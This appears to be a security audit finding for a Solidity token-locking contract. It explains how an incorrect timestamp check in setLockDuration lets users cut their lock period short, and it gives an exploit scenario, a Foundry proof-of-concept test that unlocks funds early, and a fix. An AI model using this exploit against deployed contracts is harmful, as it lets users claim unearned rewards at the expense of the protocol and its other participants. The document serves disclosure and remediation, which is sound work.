# Vulnerability details

## Details
`LockManager::setLockDuration` allows players to adjust their `lockDuration` in range `[0, MaxLockDuration]`, it also iterates over all the `lockedToken`s of user for all the `configuredTokenContracts` and checks that new `lockDuration` does not reduce `unlockTime`, however, this check is done incorrectly, as we can see in this section of the code:

        for (uint256 i; i < configuredTokensLength; i++) {
            address tokenContract = configuredTokenContracts[i];
            if (lockedTokens[msg.sender][tokenContract].quantity > 0) {
                // check they are not setting lock time before current unlocktime
                //@audit use lastLockTime instead of block.timestamp
                if (
                    uint32(block.timestamp) + uint32(_duration) <
                    lockedTokens[msg.sender][tokenContract].unlockTime
                ) {
                    revert LockDurationReducedError();
                }
                uint32 lastLockTime = lockedTokens[msg.sender][tokenContract]
                    .lastLockTime;
                lockedTokens[msg.sender][tokenContract].unlockTime =
                    lastLockTime +
                    uint32(_duration);
            }
        }

`block.timestamp` is incorrectly used instead of `lastLockTime` to check whether adding `uint32(_duration)` reduces the `unlockTime`.

Exploit Scenario:
- Alice at `block.timestamp` 1000 locks her tokens for `1000` seconds which means that her tokens will be unlocked at `block.timestamp` 2000
- After `500` seconds, alice calls `setLockDuration(_duration = 500)`
- The first condition passes since `block.timestamp (1500) + _duration (500)` is equal to `unlockTime`
- `unlockTime` is now set to `lastLockTime`(1000) + `_duration`(500) => `1500`
- Alice is able to call `unlock` function and withdraw her locked tokens whereas only `500` seconds of the `lockTime` is passed.

## Impact
users can reduce the `unlockTime` of their locked tokens equal to the % of the time passed since `lastLockTime` (e.g. if 50% of the lock period is passed, users can skip other 50%), this could result in users receiving more NFTs than intended during a LockDrop event.
For example, if LockDrop event is set to take `120` days and `lockDrop.minLockDuration` is also set to `120` days, users can unlock their tokens after 60 days by exploiting this issue and receive double unrevealed NFTs using same amount of assets.


## Proof of Concept
To run this `PoC` create a file named `LockManager.t.sol` in `/src/test/` folder.
Then copy and paste this code into `LockManager.t.sol` and run `forge test --match-test test_poc_unlockLockedTokens`:

    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.25;
    
    import {Test} from "forge-std/Test.sol";
    import {console} from "forge-std/console.sol";
    import {LockManager} from "../../src/managers/LockManager.sol";
    import "./MunchablesTest.sol";
    
    contract LockManagerTest is MunchablesTest {
    
        function test_poc_unlockLockedTokens() public {
            uint256 lockAmount = 100 ether;
    
            console.log("Beginning run()");
            deployContracts();
    
            //note register me
            amp.register(MunchablesCommonLib.Realm(3), address(0));
            logSnuggery("Initial snuggery");
    
            //note lock tokens (100 ETH)
            lm.lock{value: lockAmount}(address(0), lockAmount);
    
            //note we are using 1 day (86400) as the lock duration of user
            uint expectedUnlockTime = block.timestamp + 86400;
    
            //note half of lock time passed
            vm.warp(block.timestamp + (86400 / 2));
    
            //note this can be done because of an incorrect check:
            //block.timestamp + 43200 is more than unlockTime (pass) but unlock time is less than lastLockTime + 43200
            lm.setLockDuration((86400 / 2));
    
            //note unlock time is still not passed!
            assertGt(expectedUnlockTime, block.timestamp);
    
            //note verify that we can unlock tokens now
            uint balance_0 = address(this).balance;
            lm.unlock(address(0), lockAmount);
            uint balance_1 = address(this).balance;
            assertEq(balance_1 - balance_0, 100 ether);
        }
    }

## Recommended Mitigation Steps
When checking if new duration reduces the `unlockTime` or not, use `lastLockedTime` instead of `block.timestamp`:

                uint32 lastLockTime = lockedTokens[msg.sender][tokenContract]
                    .lastLockTime;

                if (
                    lastLockTime + uint32(_duration) <
                    lockedTokens[msg.sender][tokenContract].unlockTime
                ) {
                    revert LockDurationReducedError();
                }
